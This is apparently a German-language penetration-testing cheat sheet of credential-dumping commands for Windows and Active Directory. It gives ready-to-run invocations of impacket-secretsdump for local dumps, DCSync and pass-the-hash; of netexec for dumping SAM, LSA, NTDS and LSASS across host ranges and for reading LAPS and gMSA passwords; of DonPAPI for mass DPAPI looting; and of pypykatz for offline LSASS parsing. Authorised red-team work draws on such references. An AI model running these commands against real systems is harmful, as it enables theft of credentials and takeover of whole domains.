# KAT

#plateform/linux #target/remote #cat/CREDS

% boris, creds, dump, credentialdumping, secretsdump, impacket, sam, lsa, security, host
## [CREDS-a] impacket-secretsdump - Host lokal (SAM+LSA+SECURITY, braucht Admin)
Lokale Kontenm+Secrets eines Hosts. target IP ok (NTLM). PtH: -hashes :<nthash> statt Passwort.
```
impacket-secretsdump '<domain>/<user>:<password>@<target_fqdn>'
```

% boris, creds, dump, dcsync, secretsdump, impacket, ntds, justdc, drsuapi, domain
## [CREDS-b] impacket-secretsdump - DCSync ganze Domain (NTDS via DRSUAPI)
DA/DCSync-Rechte. -just-dc-ntlm = nur Hashes. -just-dc-user krbtgt = gezielt. Kerberos -> dc_fqdn+domain FQDN.
```
impacket-secretsdump -just-dc '<domain>/<user>:<password>@<dc_fqdn>'
```

% boris, creds, dump, secretsdump, impacket, pth, passthehash, nthash
## [CREDS-c] impacket-secretsdump - Pass-the-Hash (statt Passwort)
```
impacket-secretsdump -hashes :<nthash> '<domain>/<user>@<target_fqdn>'
```

% boris, creds, dump, nxc, sam, lsa, netexec, multihost
## [CREDS-d] nxc - SAM + LSA auf vielen Hosts (Admin noetig)
```
nxc smb <target_range> -u <user> -p '<password>' -d <domain> --sam --lsa
```

% boris, creds, dump, nxc, ntds, netexec, dc, dcsync
## [CREDS-e] nxc - NTDS dumpen (auf DC, DA-Rechte)
```
nxc smb <dc_ip> -u <user> -p '<password>' -d <domain> --ntds
```

% boris, creds, dump, nxc, lsassy, nanodump, procdump, handlekatz, lsass, module
## [CREDS-f] nxc - LSASS via Modul (lsassy Default; alt nanodump/procdump/handlekatz)
```
nxc smb <target_range> -u <user> -p '<password>' -d <domain> -M lsassy
```

% boris, creds, dump, lsassy, lsass, remote, multihost
## [CREDS-g] lsassy - LSASS remote parsen (viele Hosts)
```
lsassy -d <domain> -u <user> -p '<password>' <target_range>
```

% boris, creds, dump, donpapi, dpapi, loot, browser, wifi, vault, masse
## [CREDS-h] DonPAPI - DPAPI-Loot massenhaft (Browser/Wifi/Vaults/Creds)
PtH: -H :<nthash>. Loot landet in ~/.donpapi/loot/ ; donpapi gui zum Browsen.
```
donpapi collect -d <domain> -u <user> -p '<password>' -t <target_range>
```

% boris, creds, dump, pypykatz, offline, minidump, lsass, parse
## [CREDS-i] pypykatz - offline LSASS-Dump parsen (lsass.DMP)
```
pypykatz lsa minidump <dumpfile|lsass.DMP>
```

% boris, creds, dump, laps, nxc, ldap, localadmin, klartext
## [CREDS-j] nxc - LAPS lesen (lokale Admin-Passwoerter im Klartext)
```
nxc ldap <dc_ip> -u <user> -p '<password>' -d <domain> -M laps
```

% boris, creds, dump, gmsa, nxc, ldap, serviceaccount
## [CREDS-k] nxc - gMSA-Passwoerter lesen
```
nxc ldap <dc_ip> -u <user> -p '<password>' -d <domain> --gmsa
```
